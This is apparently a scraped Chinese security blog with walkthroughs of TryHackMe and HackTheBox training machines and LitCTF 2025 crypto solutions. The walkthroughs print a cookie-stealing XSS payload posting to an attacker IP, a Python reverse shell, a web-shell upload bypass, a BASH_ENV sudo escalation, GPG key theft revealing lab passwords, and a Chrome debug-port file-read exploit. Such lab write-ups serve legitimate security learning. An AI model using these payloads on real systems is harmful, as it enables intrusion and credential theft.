643B - /register.php [15:59:06] 403 - 278B - /server-status/ [15:59:06] 403 - 278B - /server-status Task Completed 这个时候缓一下，差点忘记21ftp没看，直接连接上去拿下来一个文件 cat update.txt Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account. - admin 知道了用户名admin和common，还有一个路径/dir/pass.txt 先访问一下网站，是个blog，最下面一行 Name: admin Comment: Hey people, I will be monitoring your comments so please be safe and civil. 管理员说自己会检查评论，可能是xss弹cookie了，让我想起来了不好的回忆(ccb)。/register.php可以去注册用户，创建一个普通账户，尝试xss没有用。尝试一下用户名\u003cscript\u003ealert(1);\u003c/script\u003e，是有效果的，那么接下来要么拿到cookie，要么拿到敏感文件。 还是先尝试拿cookie吧，毕竟是amdin \u003cscript\u003efetch(\"http://10.21.155.141:9000\",{method: \"POST\", body: document.cookie});\u003c/script\u003e bp去拦截评论发表，放包看本地回显，发现无回显，看来不太行，尝试拿文件吧，参考这个文档以及这个帖子 // TrustedSec Proof-of-Concept to steal // sensitive data through XSS payload function re","date":"2025-06-02","objectID":"/thm-whyhackme/:2:0","tags":["渗透"],"title":"THM WhyHackMe","uri":"/thm-whyhackme/"},{"categories":["靶场"],"content":"提权 jack@ubuntu:~$ sudo -l [sudo] password for jack: Matching Defaults entries for jack on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User jack may run the following commands on ubuntu: (ALL : ALL) /usr/sbin/iptables jack@ubuntu:/opt$ ls -la total 40 drwxr-xr-x 2 root root 4096 Aug 16 2023 . drwxr-xr-x 19 root root 4096 Mar 14 2023 .. -rw-r--r-- 1 root root 27247 Aug 16 2023 capture.pcap -rw-r--r-- 1 root root 388 Aug 16 2023 urgent.txt jack@ubuntu:/opt$ cat urgent.txt Hey guys, after the hack some files have been placed in /usr/lib/cgi-bin/ and when I try to remove them, they wont, even though I am root. Please go through the pcap file in /opt and help me fix the server. And I temporarily blocked the attackers access to the backdoor by using iptables rules. The cleanup of the server is still incomplete I need to start by deleting these files first. (GPT翻译：嘿，伙计们，遭到攻击之后，有一些文件被放到了 /usr/lib/cgi-bin/ 目录下，而且即使我是 root 用户，我也删不掉它们。请帮我分析一下 /opt 目录下的 pcap 文件，并帮我修复服务器。我目前已经用 iptables 规则暂时阻止了攻击者访问后门。但服务器的清理工作还没有完成，我需要先把这些文件删除掉。) jack@ubuntu:/opt$ ls -la /usr/lib/ total 1144 drwxr-xr-x 91 root root 4096 Jan 29 2024 . drwxr-xr-x 14 root root 4096 Aug 31 2022 .. drwxr-xr-x 2 root root 4096 Jan 29 2024 accountsservice drwxr-xr-x 3 root root 4096 Mar 14 2023 apache2 drwxr-xr-x 2 root root 4096 Aug 31 2022 apparmor drwxr-xr-x 5 root root 4096 Aug 31 2022 apt drwxr-xr-x 2 root root 4096 Mar 14 2023 bfd-plugins drwxr-xr-x 2 root root 4096 Apr 22 2020 binfmt.d drwxr-xr-x 3 root root 4096 Aug 31 2022 byobu drwxr-x--- 2 root h4ck3d 4096 Aug 16 2023 cgi-bin 可以看见这玩意已经被分配到h4ck3d了，还有个流量包，dump到本地，看鲨鱼启动 Listen 41312 \u003cVirtualHost *:41312\u003e ServerName www.example.com ServerAdmin webmaster@localhost ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined SSLEngine on SSLCipherSuite AES256-SHA SSLProtocol -all +TLSv1.2 SSLCertificateFile /etc/apache2/certs/apache-certificate.crt SSLCertificateKeyFile /etc/apache2/certs/apache.key ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/ AddHandler cgi-script .cgi .py .pl DocumentRoot /usr/lib/cgi-bin/ \u003cDirectory \"/usr/lib/cgi-bin\"\u003e AllowOverride All Options +ExecCGI -Multiviews +SymLinksIfOwnerMatch Order allow,deny Allow from all \u003c/Directory\u003e \u003c/VirtualHost\u003e 看看iptables 的配置 jack@ubuntu:/opt$ sudo /usr/sbin/iptables -L --line-numbers Chain INPUT (policy ACCEPT) num target prot opt source destination 1 DROP tcp -- anywhere anywhere tcp dpt:41312 2 ACCEPT all -- anywhere anywhere 3 ACCEPT all -- anywhere anywhere ctstate NEW,RELATED,ESTABLISHED 4 ACCEPT tcp -- anywhere anywhere tcp dpt:ssh 5 ACCEPT tcp -- anywhere anywhere tcp dpt:http 6 ACCEPT icmp -- anywhere anywhere icmp echo-request 7 ACCEPT icmp -- anywhere anywhere icmp echo-reply 8 DROP all -- anywhere anywhere Chain FORWARD (policy ACCEPT) num target prot opt source destination Chain OUTPUT (policy ACCEPT) num target prot opt source destination 1 ACCEPT all -- anywhere anywhere 反正都是围绕着这个端口搞的，这个端口目前不能访问的，替换规则先 jack@ubuntu:/opt$ sudo /usr/sbin/iptables -R INPUT 1 -p tcp -m tcp --dport 41312 -j ACCEPT jack@ubuntu:/opt$ sudo /usr/sbin/iptables -L --line-numbers Chain INPUT (policy ACCEPT) num target prot opt source destination 1 ACCEPT tcp -- anywhere anywhere tcp dpt:41312 2 ACCEPT all -- anywhere anywhere 3 ACCEPT all -- anywhere anywhere ctstate NEW,RELATED,ESTABLISHED 4 ACCEPT tcp -- anywhere anywhere tcp dpt:ssh 5 ACCEPT tcp -- anywhere anywhere tcp dpt:http 6 ACCEPT icmp -- anywhere anywhere icmp echo-request 7 ACCEPT icmp -- anywhere anywhere icmp echo-reply 8 DROP all -- anywhere anywhere Chain FORWARD (policy ACCEPT) num target prot opt source destination Chain OUTPUT (policy ACCEPT) num target prot opt source destination 1 ACCEPT all -- anywhere anywhere 然后访问这个端口，没有什么东西，还是HTTPS访问，估计是搞证书去解密流量包了 流量相关看这个帖子 我们已经知道 https 服务器使用 /etc/apache2/sites-enabled/000-default.conf 中 /etc/apache2/certs/apache.key 中的密钥。 用户 jack 可以读取密钥。因此，下载密钥并通过 Edit-\u003ePreferences-\u003eProtocols-\u003eTLS ","date":"2025-06-02","objectID":"/thm-whyhackme/:3:0","tags":["渗透"],"title":"THM WhyHackMe","uri":"/thm-whyhackme/"},{"categories":["靶场"],"content":"另一种root方法 看jaxafed佬的blog发现的 首先穿个pspy上去，发现一个进程调用的是root，并且是由 pyppeteer 控制的 chrome 2024/01/06 05:44:19 CMD: UID=0 PID=32385 | /root/.local/share/pyppeteer/local-chromium/588429/chrome-linux/chrome --disable-background-networking --disable-background-timer-throttling --disable-breakpad --disable-browser-side-navigation --disable-client-side-phishing-detection --disable-default-apps --disable-dev-shm-usage --disable-extensions --disable-features=site-per-process --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --disable-translate --metrics-recording-only --no-first-run --safebrowsing-disable-auto-update --enable-automation --password-store=basic --use-mock-keychain --headless --hide-scrollbars --mute-audio about:blank --no-sandbox --remote-debugging-port=46775 --user-data-dir=/root/.local/share/pyppeteer/.dev_profile/tmpk9ujyvwz 此端口可用于控制浏览器和读取本地文件，方法是使浏览器导航到具有 file:// 协议的 URL，并告诉它发送页面内容. 用的这个方法 由于漏洞利用所需的所有 Python 包在目标上不可用，因此我将在我的计算机上运行该漏洞。但是 Chrome 端口正在侦听 127.0.0.1，因此需要从外部访问它。 Chrome 进程每次都使用不同的调试端口运行，并且运行时间非常短。因此，我不会在看到进程后尝试转发端口，而是使用 ssh 建立一个 socks 代理。 修改 /etc/proxychains4.conf 以便能够将 socks 代理与 proxychains 一起使用。 ... # defaults set to \"tor\" #socks4 127.0.0.1 9050 socks5 127.0.0.1 1080 然后再修改一点东西 将 victim 更改为 127.0.0.1。 可以将目标端口作为命令行参数传递。 将 url 从 file:///etc/passwd 更改为 file:///root/root.txt。 现在，当我看到 Chrome 下次运行时，我将使用代理链和 –remote-debugging-port 参数中指定的端口来运行漏洞利用。多运行几次就可以拿到了 $ proxychains -q ./chrome_remote_debug_lfi.py 44523 ws://127.0.0.1:44523/devtools/page/3FC55BCC759CB7D158BDB700C2E84ADE {\"id\":3592,\"result\":{\"frameId\":\"3FC55BCC759CB7D158BDB700C2E84ADE\",\"loaderId\":\"B35E879C2B29484750665A8B1EF9A15A\"}} {\"id\":3593,\"result\":{\"result\":{\"type\":\"string\",\"value\":\"\u003chtml\u003e\u003chead\u003e\u003c/head\u003e\u003cbody\u003e\u003cpre style=\\\"word-wrap: break-word; white-space: pre-wrap;\\\"\u003e[REDACTED]\\n\u003c/pre\u003e\u003c/body\u003e\u003c/html\u003e\"}}} ","date":"2025-06-02","objectID":"/thm-whyhackme/:4:0","tags":["渗透"],"title":"THM WhyHackMe","uri":"/thm-whyhackme/"},{"categories":["靶场"],"content":"总结 看鲨鱼是真的不会啊xd，得补补知识了。还有xss的算是新方法吧对我来说，看别人的wp去复现两三遍也是有用的 ","date":"2025-06-02","objectID":"/thm-whyhackme/:5:0","tags":["渗透"],"title":"THM WhyHackMe","uri":"/thm-whyhackme/"},{"categories":["靶场"],"content":"前言 一个很有意思的靶机，HTB中等难度 ","date":"2025-06-02","objectID":"/htb-environment/:1:0","tags":["渗透"],"title":"HTB Environment","uri":"/htb-environment/"},{"categories":["靶场"],"content":"外网打点 按照惯例nmap+dirsearch nmap -sC -sV 10.10.11.67 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-31 20:35 CST Stats: 0:01:21 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 46.63% done; ETC: 20:38 (0:01:29 remaining) Stats: 0:02:17 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 54.81% done; ETC: 20:39 (0:01:50 remaining) Stats: 0:03:05 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 61.43% done; ETC: 20:40 (0:01:54 remaining) Stats: 0:05:10 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 79.51% done; ETC: 20:42 (0:01:19 remaining) Stats: 0:06:55 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 94.33% done; ETC: 20:43 (0:00:25 remaining) Stats: 0:06:55 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 94.34% done; ETC: 20:43 (0:00:25 remaining) Nmap scan report for 10.10.11.67 Host is up (1.1s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0) | ssh-hostkey: | 256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA) |_ 256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519) 80/tcp open http nginx 1.22.1 |_http-title: Did not follow redirect to http://environment.htb |_http-server-header: nginx/1.22.1 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel python dirsearch.py -u http://environment.htb -w /Users/zsm/CTF/tool/kali_word/dirb/wordlists/big.txt _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 20469 Target: http://environment.htb/ [20:45:45] Scanning: [20:49:52] 301 - 169B - /build -\u003e http://environment.htb/build/ [20:49:52] 301 - 169B - /build -\u003e http://environment.htb/build/ [20:52:23] 200 - 0B - /favicon.ico [20:55:04] 200 - 2KB - /login [20:55:04] 302 - 358B - /logout -\u003e http://environment.htb/login [20:55:10] 405 - 244KB - /mailing [20:58:33] 200 - 24B - /robots.txt [21:00:09] 301 - 169B - /storage -\u003e http://environment.htb/storage/ [21:01:19] 200 - 2KB - /up [21:01:20] 405 - 244KB - /upload [21:01:39] 301 - 169B - /vendor -\u003e http://environment.htb/vendor/ Task Completed 有个很明显的登录页面，进去看看，随便输入试试 有报错回显，但是目前不知道有什么可以打的地方 mailing这个也可以访问，并且看见PHP 8.2.28 — Laravel 11.30.0，在登录去打CVE-2024-52301，并且这个页面好像可以泄漏部分源码的，但是我没怎么看，直接按照cve的打了 成功登录之后发现有图片上传的地方，传个马上去，注意*.php的话访问只会下载，所以要*.php. ------WebKitFormBoundaryILrUEQYf3y8xqp85 Content-Disposition: form-data; name=\"upload\"; filename=\"zsm.php.\" Content-Type: image/png 成功拿到路径 {\"url\":\"http:\\/\\/environment.htb\\/storage\\/files\\/zsm.php\",\"uploaded\":\"http:\\/\\/environment.htb\\/storage\\/files\\/zsm.php\"} 这个马是可以用的，但是不知道为什么bash弹一直出不来，我就直接用python弹了 python3 -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.10.16.39”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")’ 可以拿到user.txt Connection from 10.10.11.67:44294 www-data@environment:~/app/storage/app/public/files$ ls ls bethany.png hish.png jono.png www-data@environment:~/app/storage/app/public/files$ cd ~ cd ~ www-data@environment:~$ ls ls app html www-data@environment:~$ cd /home cd /home www-data@environment:/home$ ls ls hish www-data@environment:/home$ cd hish cd hish www-data@environment:/home/hish$ ls ls backup root.sh user.txt ","date":"2025-06-02","objectID":"/htb-environment/:2:0","tags":["渗透"],"title":"HTB Environment","uri":"/htb-environment/"},{"categories":["靶场"],"content":"提权 先提权到用户hish，在backup里面发现好东西 www-data@environment:/home/hish/backup$ ls ls keyvault.gpg 有个gpg文件，找了个通用的方法 # 1. 拷贝 hish 用户的密钥目录 cp -r /home/hish/.gnupg /tmp/mygnupg # 2. 设置权限 chmod -R 700 /tmp/mygnupg # 3. 确认是否存在私钥 gpg --homedir /tmp/mygnupg --list-secret-keys # 4. 解密 keyvault.gpg gpg --homedir /tmp/mygnupg --output /tmp/message.txt --decrypt /home/hish/backup/keyvault.gpg www-data@environment:~$ ls /tmp ls /tmp message.txt mygnupg systemd-private-71ad283a49be45459b5ebdeb26ff8e08-systemd-logind.service-dwJgyf systemd-private-71ad283a49be45459b5ebdeb26ff8e08-systemd-timesyncd.service-LkFYou vmware-root_499-2117352874 www-data@environment:~$ cat /tmp/message.txt cat /tmp/message.txt PAYPAL.COM -\u003e Ihaves0meMon$yhere123 ENVIRONMENT.HTB -\u003e marineSPm@ster!! FACEBOOK.COM -\u003e summerSunnyB3ACH!! www-data@environment:~$ su hish su hish Password: marineSPm@ster!! 这个时候就是用户权限了，先正常信息收集 hish@environment:/var/www$ sudo -l sudo -l [sudo] password for hish: marineSPm@ster!! Matching Defaults entries for hish on environment: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env_keep+=\"ENV BASH_ENV\", use_pty User hish may run the following commands on environment: (ALL) /usr/bin/systeminfo 其中可以看到env_keep保留了ENV和BASH_ENV两个环境变量因此可以用于绕过 hish@environment:~$ echo 'bash -p' \u003e exp.sh echo 'bash -p' \u003e exp.sh hish@environment:~$ chmod +x exp.sh chmod +x exp.sh hish@environment:~$ sudo BASH_ENV=./exp.sh /usr/bin/systeminfo sudo BASH_ENV=./exp.sh /usr/bin/systeminfo root@environment:/home/hish# id id uid=0(root) gid=0(root) groups=0(root) root@environment:/home/hish# cat /root/* cat /root/* 1ec8b9b660747555f3ee577fc32f3250 cat: /root/scripts: Is a directory ","date":"2025-06-02","objectID":"/htb-environment/:3:0","tags":["渗透"],"title":"HTB Environment","uri":"/htb-environment/"},{"categories":["靶场"],"content":"总结 知道cve很关键，感觉有必要屯一点cve的poc了，pgp文件很关键，要知道怎么做，最后就是环境变量的提权 ","date":"2025-06-02","objectID":"/htb-environment/:4:0","tags":["渗透"],"title":"HTB Environment","uri":"/htb-environment/"},{"categories":["CTF"],"content":"前言 赛时因为有其他的东西就没打，赛后复现，25号一晚上写完了，感觉除了背包其他的都还好 ","date":"2025-05-26","objectID":"/litctf2025-crypto/:1:0","tags":["crypto"],"title":"Litctf2025 Crypto","uri":"/litctf2025-crypto/"},{"categories":["CTF"],"content":"题目 ","date":"2025-05-26","objectID":"/litctf2025-crypto/:2:0","tags":["crypto"],"title":"Litctf2025 Crypto","uri":"/litctf2025-crypto/"},{"categories":["CTF"],"content":"basic task.py from Crypto.Util.number import * from enc import flag m = bytes_to_long(flag) n = getPrime(1024) e = 65537 c = pow(m,e,n) print(f\"n = {n}\") print(f\"e = {e}\") print(f\"c = {c}\") 经典的n是大素数的问题 exp.py n = e = 65537 c = from Crypto.Util.number import* print(long_to_bytes(pow(c,inverse(e,n-1),n))) ","date":"2025-05-26","objectID":"/litctf2025-crypto/:2:1","tags":["crypto"],"title":"Litctf2025 Crypto","uri":"/litctf2025-crypto/"},{"categories":["CTF"],"content":"ez_math task.py from sage.all import * from Crypto.Util.number import * from uuid import uuid4 flag = b'LitCTF{'+ str(uuid4()).encode() + b'}' flag = bytes_to_long(flag) len_flag = flag.bit_length() e = 65537 p = getPrime(512) P = GF(p) A = [[flag, getPrime(len_flag)], [getPrime(len_flag), getPrime(len_flag)]] A = matrix(P, A) B = A ** e print(f\"e = {e}\") print(f\"p = {p}\") print(f\"B = {list(B)}\".replace('(', '[').replace(')', ']')) 就一个逆元xd exp.py from sage.all import * from Crypto.Util.number import long_to_bytes e = 65537 p = B = P = GF(p) B = matrix(P, B) phi = p - 1 e_inv = inverse_mod(e, phi) A = B ** e_inv flag_int = A[0,0] flag = long_to_bytes(int(flag_int)) print(flag.decode()) ","date":"2025-05-26","objectID":"/litctf2025-crypto/:2:2","tags":["crypto"],"title":"Litctf2025 Crypto","uri":"/litctf2025-crypto/"},{"categories":["CTF"],"content":"baby task.py import gmpy2 from Crypto.Util.number import * from enc import flag m = bytes_to_long(flag) g = getPrime(512) t = getPrime(150) data = (t * gmpy2.invert(m, g)) % g print(f'g = {g}') print(f'data = {data}') 一个很经典的NTRU问题 $$ data=t*m^{-1} \\mod g \\\\ data*m=t \\mod g \\\\ t=data*m+kg $$那么下面就可以造格了 $$ \\begin{pmatrix} m \u0026 k \\end{pmatrix} \\begin{pmatrix} 1 \u0026 c \\\\ 0 \u0026 g \\end{pmatrix}=\\begin{pmatrix} m \u0026 t \\end{pmatrix} $$但是注意配平，我是直接尝试了一下 exp.py import libnum from Crypto.Util.number import* g = h = Ge = Matrix(ZZ,[[1,2**200*h],[0,2**200*g]]) m,t = Ge.LLL()[0] m,t = abs(m),abs(t) print(long_to_bytes(m)) ","date":"2025-05-26","objectID":"/litctf2025-crypto/:2:3","tags":["crypto"],"title":"Litctf2025 Crypto","uri":"/litctf2025-crypto/"},{"categories":["CTF"],"content":"mmath task.py from Crypto.Util.number import * from enc import flag m = bytes_to_long(flag) e = 65537 p,q = getPrime(1024),getPrime(1024) n = p*q noise = getPrime(40) tmp1 = noise*p+noise*q tmp2 = noise*noise hint = p*q+tmp1+tmp2 c = pow(m,e,n) print(f\"n = {n}\") print(f\"e = {e}\") print(f\"c = {c}\") print(f\"hint = {hint}\") 没给noise的值，很明显需要自己去化简 $$ res=hint-n=noise^2+noise(p+q) $$那么易知noise肯定是res的因子，factor一下就可以求出来了 exp.py n = e = 65537 c = hint = from Crypto.Util.number import * res=hint-n noise=942430120937#factor分解得到的 pq=(res-noise**2)//noise print(pq) from sympy import * p, q = symbols('p q') eq1 = p + q - pq eq2 = p * q - n solutions = solve((eq1, eq2), (p, q)) print(\"p 和 q 的解：\", solutions) p= q=n//p phi=(p-1)*(q-1) print(long_to_bytes(pow(c,inverse(e,phi),n))) ","date":"2025-05-26","objectID":"/litctf2025-crypto/:2:4","tags":["crypto"],"title":"Litctf2025 Crypto","uri":"/litctf2025-crypto/"},{"categories":["CTF"],"content":"leak exp.py from Crypto.Util.number import * from enc import flag m = bytes_to_long(flag) p,q,e = getPrime(1024),getPrime(1024),getPrime(101) n = p*q temp = gmpy2.invert(e,p-1) c = pow(m,e,n) hint = temp\u003e\u003e180 print(f\"e = {e}\") print(f\"n = {n}\") print(f\"c = {c}\") print(f\"hint = {hint}\") 第一开始被唬住了，后面发现和dp高位没区别的，直接打就行了 exp.py from Crypto.Util.number import * import gmpy2 import itertools def small_roots(f, bounds, m=1, d=None): if not d: d = f.degree() print(d) R = f.base_ring() N = R.cardinality() f /= f.coefficients().pop(0) f = f.change_ring(ZZ) G = Sequence([], f.parent()) for i in range(m + 1): base = N ^ (m - i) * f ^ i for shifts in itertools.product(range(d), repeat=f.nvariables()): g = base * prod(map(power, f.variables(), shifts)) G.append(g) B, monomials = G.coefficient_matrix() monomials = vector(monomials) factors = [monomial(*bounds) for monomial in monomials] for i, factor in enumerate(factors): B.rescale_col(i, factor) B = B.dense_matrix().LLL() B = B.change_ring(QQ) for i, factor in enumerate(factors): B.rescale_col(i, 1 / factor) H = Sequence([], f.parent().change_ring(QQ)) for h in filter(None, B * monomials): H.append(h) I = H.ideal() if I.dimension() == -1: H.pop() elif I.dimension() == 0: roots = [] for root in I.variety(ring=ZZ): root = tuple(R(root[var]) for var in f.variables()) roots.append(root) return roots return [] e = n = c = leak = leak \u003c\u003c= 180 R.\u003cx,y\u003e = PolynomialRing(Zmod(n),implementation='generic') f = e * (leak + x) + (y - 1) res = small_roots(f,(2^180,2^101),m=2,d=4) print(res) for root in res: dp_low = root[0] dp = leak + dp_low tmp = pow(2,e*dp,n) - 2 p = gmpy2.gcd(tmp,n) q = n // p d = inverse(e,(p-1)*(q-1)) m = pow(c,d,n) print(long_to_bytes(m)) ","date":"2025-05-26","objectID":"/litctf2025-crypto/:2:5","tags":["crypto"],"title":"Litctf2025 Crypto","uri":"/litctf2025-crypto/"},{"categories":["CTF"],"content":"new_bag task.py from Crypto.Util.number import * import random import string def get_flag(length): characters = string.ascii_letters + string.digits + '_' flag = 'LitCTF{' + ''.join(random.choice(characters) for _ in range(length)) + '}' return flag.encode() flag = get_flag(8) print(flag) flag = bin(bytes_to_long(flag))[2:] p = getPrime(128) pubkey = [getPrime(128) for i in range(len(flag))] enc = 0 for i in range(len(flag)): enc += pubkey[i] * int(flag[i]) enc %= p f = open(\"output.txt\",\"w\") f.write(f\"p = {p}\\n\") f.write(f\"pubkey = {pubkey}\\n\") f.write(f\"enc = {enc}\\n\") f.close() 很经典的背包问题，有点像天融信安2023的一个题，但是中间填充方法不一样 这个时候就有两种处理方法了，一个是先处理，一个是后处理 后处理就是把字符列出来，然后直接寻找对应，比较暴力 exp.py from Crypto.Util.number import long_to_bytes import re def validate_flag(s): if not s.startswith(b'LitCTF{') or not s.endswith(b'}'): return False allowed_chars = set(b'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_') return all(c in allowed_chars for c in s[7:-1]) def attack(p, pubkey, enc, prefix=b'LitCTF{', suffix=b'}'): try: prefix_bits = bin(bytes_to_long(prefix))[2:] for i in range(len(prefix_bits)): enc = (enc - pubkey[i] * int(prefix_bits[i])) % p suffix_bits = bin(bytes_to_long(suffix))[2:].zfill(8) for i in range(-8, 0): enc = (enc - int(suffix_bits[i+8]) * pubkey[i]) % p mid_pubkey = pubkey[len(prefix_bits):-8] n = len(mid_pubkey) Ge = Matrix(ZZ, n + 2, n + 2) for i in range(n): Ge[i, i] = 1 Ge[i, -1] = mid_pubkey[i] Ge[-2, -2] = 1 Ge[-2, -1] = enc Ge[-1, -1] = p for vec in Ge.BKZ(block_size=25): if vec[-1] != 0: continue bits = [] valid = True for x in vec[:-2]: if abs(x) not in (0, 1): valid = False break bits.append('1' if x == 1 else '0') if not valid: continue mid_bits = ''.join(bits) full_bits = prefix_bits + mid_bits + suffix_bits try: flag = long_to_bytes(int(full_bits, 2)) if validate_flag(flag): return flag except: continue return b\"Attack failed: No valid solution found\" except Exception as e: return f\"Error: {str(e)}\".encode() p = pubkey = enc = flag = attack(p, pubkey, enc) print(flag.decode()) 这边直接用别人的脚本了，懒得改了，虽然还可以优化 先处理的话就是先利用b'LitCTF{' + b'\\x00'*8 + b'}'把他预处理一下，这个方法是学习dexter师傅的，很nb from Crypto.Util.number import * from tqdm import * p = pubkey = enc = known = b'LitCTF{' + b'\\x00'*8 + b'}' bin_known = bin(bytes_to_long(known))[2:] for i in range(len(bin_known)): enc -= pubkey[i] * int(bin_known[i]) enc %= p new_pubkey = pubkey[-72:-8] n = len(new_pubkey) d = n / log(max(new_pubkey), 2) print(CDF(d)) for k in trange(256): S = enc + k*p L = Matrix(ZZ,n+1,n+1) for i in range(n): L[i,i] = 2 L[-1,i] = 1 L[i,-1] = new_pubkey[i] L[-1,-1] = S L[:,-1] *= 2^200 for line in L.LLL(): if set(line[:-1]).issubset({-1,1}): m = '' for i in line[:-1]: if i == 1: m += '0' else: m += '1' flag = b'LitCTF{' + long_to_bytes(int(m,2)) + b'}' print(flag) ","date":"2025-05-26","objectID":"/litctf2025-crypto/:2:6","tags":["crypto"],"title":"Litctf2025 Crypto","uri":"/litctf2025-crypto/"},{"categories":["CTF"],"content":"总结 题比去年少了好多，但是质量挺高的，出了最后的背包都很新生 ","date":"2025-05-26","objectID":"/litctf2025-crypto/:3:0","tags":["crypto"],"title":"Litctf2025 Crypto","uri":"/litctf2025-crypto/"},{"categories":["靶场"],"content":"前言 一鼓作气，再刷一个，THM的一个中等靶机 ","date":"2025-05-26","objectID":"/thm-the-london-bridge/:1:0","tags":["渗透"],"title":"THM the London Bridge","uri":"/thm-the-london-bridge/"},{"categories":["靶场"],"content":"外网打点 nmap -sC -sV 10.10.207.41 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-24 20:54 CST Stats: 0:00:55 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 50.00% done; ETC: 20:55 (0:00:20 remaining) Stats: 0:01:01 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 50.00% done; ETC: 20:56 (0:00:25 remaining) Stats: 0:01:44 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 50.00% done; ETC: 20:57 (0:01:08 remaining) Nmap scan report for 10.10.207.41 Host is up (0.23s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 58:c1:e4:79:ca:70:bc:3b:8d:b8:22:17:2f:62:1a:34 (RSA) | 256 2a:b4:1f:2c:72:35:7a:c3:7a:5c:7d:47:d6:d0:73:c8 (ECDSA) |_ 256 1c:7e:d2:c9:dd:c2:e4:ac:11:7e:45:6a:2f:44:af:0f (ED25519) 8080/tcp open http-proxy gunicorn |_http-title: Explore London | fingerprint-strings: | GetRequest: | HTTP/1.0 200 OK | Server: gunicorn | Date: Sat, 24 May 2025 12:55:24 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Content-Length: 2682 | \u003c!DOCTYPE html\u003e | \u003chtml lang=\"en\"\u003e | \u003chead\u003e | \u003cmeta charset=\"UTF-8\"\u003e | \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e | \u003ctitle\u003eExplore London\u003c/title\u003e | \u003cstyle\u003e | body { | font-family: Arial, sans-serif; | margin: 0; | padding: 0; | background-color: #f2f2f2; | header { | background-color: #333; | color: #fff; | padding: 10px 20px; | text-align: center; | background-color: #444; | color: #fff; | padding: 10px 20px; | text-align: center; | color: #fff; | text-decoration: none; | margin: 0 10p | HTTPOptions: | HTTP/1.0 200 OK | Server: gunicorn | Date: Sat, 24 May 2025 12:55:25 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Allow: HEAD, GET, OPTIONS |_ Content-Length: 0 |_http-server-header: gunicorn 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : ... Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 178.62 seconds 没什么有用的，disearch启动 python dirsearch.py -u http://10.10.207.41:8080 -w /Users/zsm/CTF/tool/kali_word/dirb/wordlists/big.txt _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 20469 Target: http://10.10.207.41:8080/ [21:07:24] Scanning: [21:08:23] 200 - 2KB - /contact [21:08:47] 405 - 178B - /feedback [21:08:55] 200 - 2KB - /gallery [21:10:46] 405 - 178B - /upload [21:10:51] 405 - 178B - /view_image Task Completed 访问view_image，得到 Method Not Allowed The method is not allowed for the requested URL. GET不行，换POST，发现让你传url，并且会解析成img，估计是打ssrf的，ffuf测试一下 ./ffuf -u 'http://10.10.207.41:8080//view_image' -w /Users/zsm/CTF/tool/kali_word/dirb/wordlists/big.txt -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'FUZZ=http://10.21.155.141/test' -mc all -t 50 -ic -fs 823 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0 ________________________________________________ :: Method : POST :: URL : http://10.10.207.41:8080//view_image :: Wordlist : FUZZ: /Users/zsm/CTF/tool/kali_word/dirb/wordlists/big.txt :: Header : Content-Type: application/x-www-form-urlencoded :: Data : FUZZ=http://10.21.155.141/test :: Follow redirects : false :: Calibration : false :: Timeout : 10 